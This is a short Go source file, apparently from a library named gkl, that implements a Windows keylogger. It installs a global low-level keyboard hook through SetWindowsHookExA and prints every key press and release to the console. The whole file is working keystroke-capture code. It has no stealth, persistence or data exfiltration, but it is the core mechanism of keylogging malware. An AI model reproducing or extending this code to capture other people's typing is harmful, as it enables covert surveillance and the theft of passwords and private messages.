package keylogger

import (
	"fmt"
	"unsafe"

	"github.com/Spriithy/gkl/user32"
	"github.com/Spriithy/gkl/wintypes"
)

var whKeyStateNames = map[wintypes.WPARAM]string{
	wintypes.WM_KEYUP:      "KeyUp",
	wintypes.WM_KEYDOWN:    "KeyDown",
	wintypes.WM_SYSKEYUP:   "SysKeyUp",
	wintypes.WM_SYSKEYDOWN: "SysKeyDown",
}

type KeyLogger struct {
}

func NewKeylogger() *KeyLogger {
	return &KeyLogger{}
}

func (kl *KeyLogger) Start() {
	user32.SetWindowsHookExA(wintypes.WH_KEYBOARD_LL, kl.hook, wintypes.NULL, 0)
	var msg wintypes.MSG
	for user32.GetMessageA(&msg, 0, 0, 0) != 0 {
	}
}

func (kl *KeyLogger) hook(nCode int, wParam wintypes.WPARAM, lParam wintypes.LPARAM) wintypes.LRESULT {
	kbd := (*wintypes.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
	key := byte(kbd.VkCode)
	fmt.Printf("%-10s: %q\n", whKeyStateNames[wParam], key)
	return user32.CallNextHookEx(0, nCode, wParam, lParam)
}